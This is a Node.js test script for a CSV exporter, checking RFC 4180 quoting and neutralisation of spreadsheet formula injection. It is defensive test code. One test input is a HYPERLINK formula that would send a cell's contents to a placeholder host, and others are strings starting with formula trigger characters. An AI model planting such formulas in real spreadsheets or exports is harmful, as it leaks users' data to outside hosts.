#!/usr/bin/env node
/**
 * CSV export: RFC 4180 quoting, and no formula injection.
 *
 * The exports carry free text members typed, and they are opened in Excel or
 * Sheets by a lead. A cell starting with = + - @ runs as a formula there.
 */

import { toCsv } from '../../src/lib/exportCsv.js'

let passed = 0
function check(name, cond, detail = '') {
  if (cond) {
    passed += 1
    console.log(`ok    ${name}`)
  } else {
    console.error(`FAIL  ${name} ${detail}`)
    process.exitCode = 1
  }
}

const one = (v) => toCsv([{ v }], ['v']).split('\r\n')[1]

check('a formula in a note is neutralised', one('=HYPERLINK("https://x.test/?"&A2,"x")').startsWith(`"'=`), one('=1+1'))
for (const lead of ['+', '-', '@', '\t']) {
  check(`a string starting with ${JSON.stringify(lead)} is prefixed`, one(`${lead}cmd`).replace(/^"/, '').startsWith(`'${lead}`), one(`${lead}cmd`))
}
check('a real negative number stays a number', one(-3) === '-3', one(-3))
check('ordinary text is untouched', one('fast cycler') === 'fast cycler')
check('commas and quotes are quoted per RFC 4180', one('a, "b"') === '"a, ""b"""', one('a, "b"'))
check('objects become JSON, not [object Object]', one({ a: 1 }) === '"{""a"":1}"', one({ a: 1 }))
check('null is an empty cell', one(null) === '')

console.log(`\n${passed} csv case(s) passed`)
if (process.exitCode) console.error('CSV TESTS FAILED')
